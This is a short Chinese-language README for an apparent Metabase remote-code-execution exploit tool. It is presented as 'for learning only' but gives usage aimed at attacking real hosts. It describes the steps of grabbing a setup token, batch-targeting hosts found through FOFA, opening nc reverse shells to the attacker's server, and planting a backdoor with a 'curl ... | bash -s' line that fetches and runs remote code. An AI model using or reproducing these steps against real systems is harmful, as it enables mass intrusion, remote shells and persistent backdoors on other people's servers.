# metabase_exp
metabase rce
# 仅供学习使用
漏洞利用过程为：获取token->测试token是否可用->尝试nc反弹->尝试自定义命令留后门


获取token

python3 metabase_exp.py poc -u xxx.com

批量获取token    fofa搜的json可以直接用，其他的需要手工改一下host定位字段

python3  metabase_exp.py poc -f 文件名.json -o 输出文件名.json



尝试nc反弹

python3 metabase_exp.py exp -u xxx.com -t xxx -i 服务器ip -p 服务器端口

nc批量弹，虽然nc只能上线一个但是token不一定每个都能用，所以批量上方便点哪台弹上打哪台，然后把批量文件中打进去的哪台以上都删掉，或者多打几遍有脏东西的有的时候就是会莫名其妙上线不了

python3 metabase_exp.py exp -f poc生成的json文件 -i 服务器ip -p 服务器端口



尝试自定义命令留后门
我的思路是curl -A O  -o- -L http://xxx/a.html | bash -s 直接把要执行的命令写a.html里面，payload写太长会出问题不能执行

python3 metabase_exp.py backdoor  -f/-u -t  json文件/ip token -payload 你的payload




太菜了写的不是很好啊哈哈


我的库版本
certifi            2023.5.7
charset-normalizer 3.2.0
pip                23.2.1
pycryptodomex      3.14.0
requests           2.31.0
setuptools         67.6.1
urllib3            2.0.3
wheel              0.40.0
版本问题没试过
